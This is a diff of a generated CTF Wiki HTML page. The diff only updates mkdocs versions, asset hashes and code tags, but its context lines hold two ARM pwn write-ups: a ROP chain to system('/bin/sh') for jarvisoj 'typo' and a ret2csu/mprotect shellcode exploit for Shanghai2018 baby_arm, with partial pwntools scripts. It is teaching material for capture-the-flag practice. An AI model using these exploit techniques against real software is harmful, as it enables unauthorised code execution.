@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4753,7 +4753,7 @@
 <h2 id="jarvisoj-typo">jarvisoj - typo<a class="headerlink" href="#jarvisoj-typo" title="Permanent link">&para;</a></h2>
 <p>Here is an example of jarvisoj&#39;s typo, which can be downloaded at [ctf-challenge] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo</a>)</p>
 <h3 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> check ./typo
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> check ./typo
 
 typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
 
@@ -4767,12 +4767,12 @@ typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span
     NX:       NX enabled
 
 FOOT: No FOOT <span class="o">(</span>0x8000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>Statically linked programs, no open stack overflow protection and PIE; static link instructions, we can find dangerous functions such as <strong>system</strong> and <strong>&quot;/bin/sh&quot;</strong> sensitive strings in binary, because it is No PIE, so we only need stack overflow to construct ropchain to get shell</p>
 <h3 id="using-ideas">Using ideas<a class="headerlink" href="#using-ideas" title="Permanent link">&para;</a></h3>
 <p>So we need to find an overflow point, run the program first, because it is statically linked, so you can run it directly when the environment is configured well.
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master ●●<span class="o">]</span> ./typo
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master ●●<span class="o">]</span> ./typo
 Let<span class="err">&#39;</span>s Do Some Typing Exercise~
 
 Press Enter to get start<span class="p">;</span>
@@ -4795,11 +4795,11 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
 
 <span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">1172</span> segmentation fault  ./typo
-</pre></div></p>
+</code></pre></div></p>
 <p>There are not many input points in the program, it is easy to find the overflow point.</p>
 <h3 id="constructing-rop">Constructing ROP<a class="headerlink" href="#constructing-rop" title="Permanent link">&para;</a></h3>
 <p>So the idea is very obvious, using the stack overflow construct <strong>system(&quot;/bin/sh&quot;)</strong>, first find the gadgets
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&quot;pop&quot;</span>   
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&quot;pop&quot;</span>   
 
 Gadgets <span class="nv">information</span>
 
@@ -4834,9 +4834,9 @@ Gadgets <span class="nv">information</span>
 
 
 Unique gadgets found: <span class="m">13</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>We only need to control the first parameter, so we can choose <code>pop {r0, r4, pc}</code> this gadgets to construct the following stack structure.
-<div class="codehilite"><pre><span></span>+-------------+
+<div class="codehilite"><pre><span></span><code>+-------------+
 
 |             |
 
@@ -4863,18 +4863,18 @@ Unique gadgets found: <span class="m">13</span>
 |system_addr  |
 
 +-------------+
-</pre></div></p>
+</code></pre></div></p>
 <p>At this time, you need the length of padding and the address of system and /bin/sh. The address of /bin/sh can be found with ROPgadget.
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh
 
 Strings <span class="nv">information</span>
 
 <span class="o">============================================================</span>
 
 0x0006cb70 : /bin/sh
-</pre></div></p>
+</code></pre></div></p>
 <p>The length of padding can be easily found using pwntools&#39; <strong>cyclic</strong>
-<div class="codehilite"><pre><span></span>pwndbg&gt; cyclic 200
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; cyclic 200
 
 aaaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababa
 pwndbg&gt; c
@@ -4959,11 +4959,11 @@ Program received signal SIGSEGV
 pwndbg&gt; cyclic -l 0x62616164
 
 112
-</pre></div></p>
+</code></pre></div></p>
 <p>So the padding length is 112
 &gt; Or you can blast the stack overflow directly more violently</p>
 <p>As for the address of system, because the binary is removed from the symbol table, we can first use <code>rizzo</code> to restore part of the symbol table (for the recovery symbol table, you can see the reference link first, and will introduce it later). Although rizzo does not work well on this binary, it is fortunate that there are just a few systems in the identified functions.
-<div class="codehilite"><pre><span></span><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">system</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">system</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -4982,11 +4982,11 @@ pwndbg&gt; cyclic -l 0x62616164
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>&gt; Or you can find the system function by searching for the /bin/sh string</p>
 <h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
 <p>All the conditions are there, construct system(&quot;/bin/sh&quot;)
-<div class="codehilite"><pre><span></span>jarvisOJ_typo [master●●] cat solve.py 
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo [master●●] cat solve.py 
 
 #!/usr/bin/env python
 
@@ -5067,11 +5067,11 @@ io.close ()
     else:
 
 io.interactive ()
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="2018-shanghai-university-student-network-security-competition-baby_arm">2018 Shanghai University Student Network Security Competition - baby_arm<a class="headerlink" href="#2018-shanghai-university-student-network-security-competition-baby_arm" title="Permanent link">&para;</a></h2>
 <h3 id="static-analysis">Static analysis<a class="headerlink" href="#static-analysis" title="Permanent link">&para;</a></h3>
 <p>The title gave a <code>aarch64</code> schema file without open canary protection
-<div class="codehilite"><pre><span></span>Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn
+<div class="codehilite"><pre><span></span><code>Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn
 
 + file ./pwn
 ./pwn: ELF <span class="m">64</span>-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux <span class="m">3</span>.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
@@ -5089,9 +5089,9 @@ io.interactive ()
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>Look at the program logic
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5120,11 +5120,11 @@ io.interactive ()
   <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v0</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>The trunk of the program reads 512 characters to a global variable, and in <code>sub_4007F0()</code>, it reads 512 bytes onto the stack. Note that this starts directly from <code>frame pointer + 0x10</code> Read, so it doesn&#39;t matter if you turn on canary protection.</p>
 <h3 id="ideas">Ideas<a class="headerlink" href="#ideas" title="Permanent link">&para;</a></h3>
 <p>Take a look at the idea, you can directly rop, but we do not know the remote libc version, but also found that the program has a code segment called <code>mprotect</code>
-<div class="codehilite"><pre><span></span>.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
+<div class="codehilite"><pre><span></span><code>.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
 .text:00000000004007CC                 MOV             X29, SP
 
 .text:00000000004007D0                 MOV             W2, #0
@@ -5142,7 +5142,7 @@ io.interactive ()
 .text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
 
 .text: 00000000004007EC RET
-</pre></div></p>
+</code></pre></div></p>
 <p>But this code sets the permission bit of <code>mprotect</code> to 0, there is no executable permission, which requires us to control the permissions such as bss section by rop control <code>mprotect</code> to be writable executable.</p>
 <p>So you can have the following ideas:</p>
 <ol>
@@ -5151,7 +5151,7 @@ io.interactive ()
 <li>Return to the shellcode on bss</li>
 </ol>
 <p><code>mprotect</code> needs to control three parameters, you can consider using <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu">ret2csu</a> This method can be found as follows Gadgets to control the <code>x0, x1, x2</code> registers
-<div class="codehilite"><pre><span></span>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+<div class="codehilite"><pre><span></span><code>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
 
 .text:00000000004008B0                 MOV             X2, X22
 
@@ -5180,9 +5180,9 @@ io.interactive ()
 .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
 
 .text: 00000000004008DC RET
-</pre></div></p>
+</code></pre></div></p>
 <p>The final <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> is as follows:
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
@@ -5277,26 +5277,26 @@ io.interactive ()
 
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-</pre></div></p>
+</code></pre></div></p>
 <h3 id="notice">notice<a class="headerlink" href="#notice" title="Permanent link">&para;</a></h3>
 <p>At the same time, it should be noted that the result of the <code>checksec</code> detection is that nx protection is turned on, but the result of this detection is not necessarily accurate, because the nx protection of the program can also be determined by the parameter <code>-nx</code> when qemu is started (such as this The problem can be nx protected by the error detection program when the remote fails. The old version of qemu may not have this parameter.
-<div class="codehilite"><pre><span></span>Desktop ./qemu-aarch64 --version
+<div class="codehilite"><pre><span></span><code>Desktop ./qemu-aarch64 --version
 
 qemu-aarch64 version <span class="m">2</span>.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003</span>-2016 Fabrice Bellard and the QEMU Project developers
 
 Desktop ./qemu-aarch64 -h<span class="p">|</span> grep nx
 
 -nx           QEMU_NX           <span class="nb">enable</span> NX implementation
-</pre></div></p>
+</code></pre></div></p>
 <p>If there is an error below, there is no assembler for aarch64
-<div class="codehilite"><pre><span></span><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
 
     Try installing binutils <span class="k">for</span> this architecture:
 
     https://docs.pwntools.com/en/stable/install/binutils.html
-</pre></div></p>
+</code></pre></div></p>
 <p>Can refer to the official documentation solution
-<div class="codehilite"><pre><span></span>Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
+<div class="codehilite"><pre><span></span><code>Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
 
 p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target
 
@@ -5307,7 +5307,7 @@ p   binutils-aarch64-linux-gnu-dbg                                     - GNU bin
 p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>
 
 Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu
-</pre></div></p>
+</code></pre></div></p>
 <p>&gt; aarch64 files are <code>arm64</code> when libc is installed and <code>aarch64</code> when <code>binutils</code> is installed.</p>
 <h2 id="example">Example<a class="headerlink" href="#example" title="Permanent link">&para;</a></h2>
 <p>Codegate2015 - looked</p>
@@ -5378,7 +5378,7 @@ Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> 
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5393,7 +5393,7 @@ Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> 
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
